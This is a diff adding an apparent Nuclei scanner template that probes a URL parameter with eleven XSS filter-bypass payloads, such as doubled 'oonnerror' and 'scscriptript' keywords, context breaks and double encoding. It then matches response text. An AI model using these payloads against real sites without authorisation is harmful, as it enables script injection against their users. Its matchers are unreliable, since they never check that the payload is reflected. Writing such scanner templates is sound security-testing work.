@@ -1,0 +1,145 @@
+id: xss-filter-bypass
+
+info:
+  name: XSS Filter Bypass Detection (script/on/javascript)
+  author: custom
+  severity: high
+  description: Detects XSS vulnerability with filter bypass for "script", "on", "javascript:" keywords
+  tags: xss,filter-bypass,custom
+
+variables:
+  random: "{{1}}"
+
+http:
+  - raw:
+      # Case 1: Double "on" to bypass single filter -> "oonn" becomes "on"
+      - |
+        GET {{BaseURL}}?param=%3Cimg%20src%3Dx%20oonnerror%3D%22alert({{random}})%22%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 2: Double "on" without quotes
+      - |
+        GET {{BaseURL}}?param=%3Cimg%20src%3Dx%20oonnerror%3Dalert({{random}})%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 3: svg with oonload
+      - |
+        GET {{BaseURL}}?param=%3Csvg%20oonload%3Dalert({{random}})%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 4: body tag with oonload
+      - |
+        GET {{BaseURL}}?param=%3Cbody%20oonload%3Dalert({{random}})%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 5: iframe with oonload
+      - |
+        GET {{BaseURL}}?param=%3Ciframe%20oonload%3Dalert({{random}})%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 6: img with oonnclick
+      - |
+        GET {{BaseURL}}?param=%3Cimg%20src%3Dx%20oonnclick%3Dalert({{random}})%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 7: img with oonnmouseover
+      - |
+        GET {{BaseURL}}?param=%3Cimg%20src%3Dx%20oonnmouseover%3Dalert({{random}})%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 8: Double encoding attempt
+      - |
+        GET {{BaseURL}}?param=%253Cimg%2520src%253Dx%2520oonnerror%253Dalert({{random}})%253E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 9: scriptscript tag bypass
+      - |
+        GET {{BaseURL}}?param=%3Cscscriptript%3Ealert({{random}})%3C%2Fscscriptript%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 10: With context break "><
+      - |
+        GET {{BaseURL}}?param=%22%3E%3Cimg%20src%3Dx%20oonnerror%3Dalert({{random}})%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+      # Case 11: With context break '>
+      - |
+        GET {{BaseURL}}?param=%27%3E%3Cimg%20src%3Dx%20oonnerror%3Dalert({{random}})%3E HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+    stop-at-first-match: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: reflected-xss-bypass
+        dsl:
+          - 'contains(body, "onerror")'
+          - 'contains(body, "onload")'
+          - 'contains(body, "onclick")'
+          - 'contains(body, "onmouseover")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: dom-xss-vulnerable-pattern
+        dsl:
+          - 'contains(body, ".innerHTML")'
+          - 'contains(body, "URLSearchParams")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
+
+      - type: dsl
+        name: script-tag-bypass
+        dsl:
+          - 'contains(body, "<script>")'
+          - 'contains(body, "alert(")'
+          - 'status_code == 200'
+          - 'contains(content_type, "text/html")'
+        condition: and
